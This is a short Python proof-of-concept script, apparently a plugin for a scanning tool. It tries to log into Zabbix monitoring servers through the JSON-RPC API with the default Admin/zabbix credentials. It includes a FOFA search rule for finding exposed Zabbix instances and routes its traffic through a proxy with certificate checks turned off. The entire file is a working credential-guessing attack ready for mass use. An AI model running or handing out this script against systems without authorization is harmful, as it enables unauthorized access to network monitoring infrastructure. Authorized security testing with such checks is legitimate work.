#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import json
import requests

from Config.config_proxies import proxies
from Config.config_requests import ua

requests.packages.urllib3.disable_warnings()

# 脚本信息
######################################################
NAME='Zabbix_default_password'
AUTHOR="RabbitMask"
REMARK='zabbix 默认密码'
FOFA_RULE='app="ZABBIX-监控系统"'
######################################################

def poc(target):
    result={}
    headers={
        "User-Agent": ua,
        'Content-Type':'application/json',
    }

    data = {
        "jsonrpc": "2.0",
        "method": "user.login",
        "params": {
            "user": "Admin",
            "password": "zabbix"
        },
        "id": 1
    }

    try:
        r = requests.post(target+"/api_jsonrpc.php",headers=headers, data=json.dumps(data), verify=False,timeout=3,proxies=proxies)
        if r.status_code==404:
            rr = requests.post(target + "/zabbix/api_jsonrpc.php", headers=headers, data=json.dumps(data), verify=False, timeout=3,proxies=proxies)
            if rr.status_code == 200 and 'result' in rr.text and 'error' not in rr.text:
                result['target'] = target
                result['poc'] = NAME
                result['username'] = 'Admin'
                result['password'] = 'zabbix'
                return result
        elif r.status_code ==200 and 'result' in r.text and 'error' not in r.text:
            result['target'] = target
            result['poc'] = NAME
            result['username'] = 'Admin'
            result['password']='zabbix'
            return result
    except:
        pass



if __name__ == '__main__':
    poc("http://127.0.0.1/")